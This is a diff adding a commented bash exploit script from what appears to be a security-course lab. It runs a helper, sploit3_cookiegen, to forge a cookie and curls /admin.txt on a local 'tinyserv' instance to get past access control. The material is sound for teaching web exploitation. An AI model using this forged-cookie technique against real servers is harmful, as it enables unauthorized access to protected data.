@@ -1,0 +1,42 @@
+#!/bin/bash
+
+# This is just for parsing the port and management components
+gitroot=$(git rev-parse --show-toplevel)
+source $gitroot/lab3_port
+source $gitroot/lab3_group_secret
+
+# Check that you ran make
+if ! make -q -C $gitroot/sploit/sploit3_cookiegen > /dev/null ; then
+    echo -e "You need to build sploit3_cookiegen first! (use make)"
+    exit 1
+fi
+
+
+# This shell script holds just one `curl` command
+# that makes an HTTP GET request (https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods).
+
+# Explanation of the arguments to curl, these ones are common across all curl interactions with tinyserv.
+
+# -G means make a GET request
+# -o means log to a file
+# --ignore-content-length means ignore what the server says the file size is, and just keep reading data until the server stops sending
+# --silent means don't show a progress bar while this all happens
+# --verbose means show the headers from the request and the response (contradictory with silent, i know)
+# --cookie "LAB_GROUP_SECRET_KEY=${LAB_GROUP_SECRET_KEY}" is used to authenticate your request and prevent other groups from exploiting your tinyserv instance
+
+# These parts are unique to this sploit
+
+# The other component passed to --cookie is an extra cookie that we are asking curl to send along with our request
+# -- http://127.0.0.1:${GROUP_PORT_NO}/admin.txt the "-- " here means 'no more args follow', and the rest is the URL/file we want
+
+# Delete the previous sploit outputs
+echo "" > sploit_output.txt
+
+# This is an extra tool the attacker has as part of this exploit sample. It is being run by you (as the attacker) as part of the exploit.
+extracookie=$(./sploit3_cookiegen/sploit3_cookiegen)
+
+# Note that this curl sends the cookie generated above as one of its cookies
+curl -G -o sploit_output.txt  --ignore-content-length --silent --verbose --cookie "LAB_GROUP_SECRET_KEY=${LAB_GROUP_SECRET_KEY}; ${extracookie}" -- http://127.0.0.1:${GROUP_PORT_NO}/admin.txt 
+
+# For convenience, we then print what we got back from the curl command
+cat sploit_output.txt
